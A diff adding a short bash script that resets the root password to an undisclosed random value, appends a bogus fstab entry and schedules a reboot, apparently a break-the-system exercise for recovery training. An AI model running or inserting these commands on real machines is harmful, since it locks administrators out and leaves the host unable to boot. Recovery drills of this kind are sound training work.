@@ -1,0 +1,9 @@
+#!/bin/bash
+
+echo `openssl rand -base64 14`|passwd --stdin root
+
+echo "/fake /fake_dir xfs defaults 0 0" >>/etc/fstab
+
+shutdown -r +5 “System rebooting in 5 minutes”
+
+exit 0
